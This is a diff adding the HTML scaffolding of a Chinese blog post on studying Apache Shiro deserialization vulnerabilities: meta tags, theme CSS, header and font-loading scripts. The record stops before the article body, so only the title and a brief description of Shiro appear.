@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wenfenhui">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wenfenhui">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,博客,技术,编程">
+    <meta name="description" content="个人技术博客，记录学习与成长">
+    <meta name="description" content="shiro反序列化漏洞学习shiro介绍  Apache Shiro是一个强大且易用的Java安全框架，提供了身份验证、授权、密码学和会话管理等功能。它被广泛用于保护各种类型的应用程序，包括Web应用、RESTful服务、移动应用和大型企业级应用。使用Shiro，你可以将安全性集成到应用程序中而不必担心复杂的实现细节。在历史上，shiro的历史漏洞大部分都是一些对路径未标准化进行的一个bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro反序列化漏洞学习">
+<meta property="og:url" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Wenfenhui&#39;s Blog">
+<meta property="og:description" content="shiro反序列化漏洞学习shiro介绍  Apache Shiro是一个强大且易用的Java安全框架，提供了身份验证、授权、密码学和会话管理等功能。它被广泛用于保护各种类型的应用程序，包括Web应用、RESTful服务、移动应用和大型企业级应用。使用Shiro，你可以将安全性集成到应用程序中而不必担心复杂的实现细节。在历史上，shiro的历史漏洞大部分都是一些对路径未标准化进行的一个bypass">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419152806052.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419153252621.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419154346322.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419155732106.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419161303504.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419161627062.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419162200943.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419162838289.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419164754751.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419170949104.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171052942.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171424034.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171716017.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171752888.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419205601351.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420025803304.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420030524322.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420030635049.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420032344045.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420032922135.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420033010139.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420033037591.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420052026351.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420052106273.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420050146873.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420051706266.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420051800462.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420054104100.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055655973.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055727559.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055832481.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420060137025.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420060154748.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421002940516.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421005003948.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421005120813.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420230638526.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421010210589.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421140517583.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421165841656.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170304875.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170319321.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170557480.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170642625.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214400302.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214823314.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214912450.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231608179.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231656150.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421233239202.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421232211305.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231459084.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422004601124.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422012743782.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422012822367.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422005821102.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010020266.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010215553.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010530815.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010724825.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422011446954.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422011659140.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020044986.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020113668.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020256063.png">
+<meta property="og:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020324233.png">
+<meta property="article:published_time" content="2026-04-21T10:20:45.000Z">
+<meta property="article:modified_time" content="2026-04-21T18:20:45.602Z">
+<meta property="article:author" content="wenfenhui">
+<meta property="article:tag" content="shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419152806052.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>shiro反序列化漏洞学习 · Wenfenhui&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Wenfenhui's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Wenfenhui&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">shiro反序列化漏洞学习</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                shiro反序列化漏洞学习
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="shiro">shiro</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2026/04/21</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
